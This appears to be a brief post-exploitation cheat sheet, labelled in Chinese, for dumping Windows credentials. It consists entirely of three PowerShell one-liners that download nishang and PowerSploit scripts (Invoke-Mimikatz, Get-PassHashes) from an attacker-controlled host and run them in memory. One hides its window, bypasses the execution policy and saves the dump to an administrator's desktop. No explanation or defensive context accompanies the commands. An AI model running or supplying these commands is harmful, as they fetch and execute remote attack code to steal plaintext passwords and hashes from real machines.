	抓明文
	>powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.108/nishang/Gather/Invoke-Mimikatz.ps1'); Invoke-Mimikatz
	抓hash
	>powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.100/nishang/Gather/Get-PassHashes.ps1');Get-PassHashes
	>powershell -w hidden -ep bypass "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/powersploit/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz" >C:\Users\Administrator.DC\Desktop\1123.txt